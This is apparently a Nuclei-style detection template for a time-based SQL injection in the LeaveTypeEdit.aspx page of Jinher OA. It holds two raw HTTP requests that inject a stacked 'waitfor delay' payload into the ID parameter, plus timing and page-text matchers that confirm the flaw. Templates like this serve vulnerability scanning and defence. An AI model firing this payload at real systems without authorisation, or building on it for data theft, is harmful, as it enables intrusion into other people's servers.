id: poc-yaml-jinher-jhsoft-leavetypeedit-aspx-sqli
info:
  name: 金和OA LeaveTypeEdit.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA

http:
  - raw:
      - |
        GET /c6/Jhsoft.Web.dossier/LeaveTypeEdit.aspx/?ID=1;waitfor+delay%270:0:5%27--&type=EDIT HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/Jhsoft.Web.dossier/LeaveTypeEdit.aspx/?ID=1;waitfor+delay%270:0:8%27--&type=EDIT HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "类型名称不能为空"
          - "修改类型"
          - "类型名称"
        condition: and
        part: body
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
